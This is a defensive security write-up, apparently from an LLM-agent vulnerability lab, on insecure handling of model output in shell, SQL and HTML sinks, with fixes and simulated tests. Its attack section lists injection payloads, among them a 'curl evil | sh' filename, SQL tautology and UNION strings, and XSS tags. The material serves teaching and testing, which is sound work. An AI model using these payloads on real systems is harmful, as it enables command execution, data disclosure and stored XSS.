# S5: Insecure output handling

**Maps to:** LLM05 · ASI05 · AML.T0053 · mitigation AML.M0033 ([mapping](../mapping.md))

## The flaw
Model output is attacker-influenced (via injection or the user) but is used as if it were trusted program input: spliced into a command line, an SQL string and an HTML page.

## The attack
Three sinks, one payload corpus each:
- **Shell (`file_stats`)** builds `wc -c <filename>`. `a.txt; curl evil | sh`, `&&`, `|`, `$(...)`, backticks, an unquoted newline and `>` redirection start extra commands; a leading `--` injects an option.
- **SQL (`lookup_customer`)** builds the query with an f-string. `x' OR '1'='1` dumps every customer; `x' UNION SELECT name, note FROM customers --` leaks private notes.
- **HTML (`write_report`)** interpolates title and body raw. `<script>`, `onerror=`, `javascript:`, `<svg onload>` and `<iframe>` become stored XSS.

## Impact
Command injection, data disclosure and stored XSS, all triggered by text the model produced.

## The fix (`fixes/s5_safe_sinks`)
Treat model output like any other untrusted input at the point of use:
- shell: validated filename, confined path, **argv list, no shell**;
- SQL: shape check **and** a bound parameter, on a `query_only` connection;
- HTML: `html.escape` both fields, plus a `default-src 'none'` CSP;
- every tool: `validate_args` rejects extra or missing keys, non-strings, over-long values and NUL bytes.

## Evidence
`tests/test_s5_output_handling.py` (50 tests). Nothing is really executed: `agent/shellsim.py` parses a command line the way a POSIX shell would and lists the commands it would have started, so the tests assert on *which commands spawn*. Each shell payload spawns extra commands on the vulnerable sink and nothing but `wc` on the fixed one; both SQL payloads leak canaries on the baseline and are blocked by the fix; every XSS payload yields active content on the baseline and none after the fix (checked with an HTML parser, not a regex); the `query_only` backstop is tested directly.

One test is worth reading: `Alice Example' --` passes the shape check and is harmless **only** because of the bound parameter. The regex is defence in depth, not the control.

## What this does not show
Escaping reduces reports to plain text; safe rich formatting needs a vetted Markdown renderer plus an HTML sanitiser (allow-list of tags and attributes). Real command execution still belongs in a throwaway no-network container.
